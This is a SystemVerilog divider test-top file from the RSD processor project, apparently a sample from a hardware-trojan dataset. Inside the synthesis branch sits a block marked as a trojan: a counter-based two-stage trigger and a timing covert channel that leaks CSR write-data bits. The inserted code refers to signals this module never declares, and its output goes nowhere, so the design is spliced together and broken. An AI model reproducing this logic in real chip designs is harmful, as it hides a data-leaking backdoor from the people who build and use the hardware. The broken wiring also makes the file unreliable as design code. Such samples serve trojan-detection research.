// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;

module TestRefDividerTop_trojan_Covert(
input
    logic clk_p, clk_n, rst,
    logic req,                  // request a new operation
    DataPath dividend,
    DataPath divisor,
    logic isSigned,             // operation is performed in a singed mode
output
    logic finished,      // Asserted when a result is obtained.
    DataPath quotient,
    DataPath remainder,
    logic refFinished,      
    DataPath refQuotient,
    DataPath refRemainder
);
    
    logic clk;
`ifdef RSD_SYNTHESIS
    SingleClock clkgen(clk_p, clk_n, clk);

    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=20154)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20154;
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


`else
    assign clk = clk_p;
`endif

    Divider divider(
        .quotient(quotient),
        .remainder(remainder),
        .finished(finished),
        .*
    );

    RefDivider refDivider(
        .quotient(refQuotient),
        .remainder(refRemainder),
        .finished(refFinished),
        .*
    );
    
endmodule
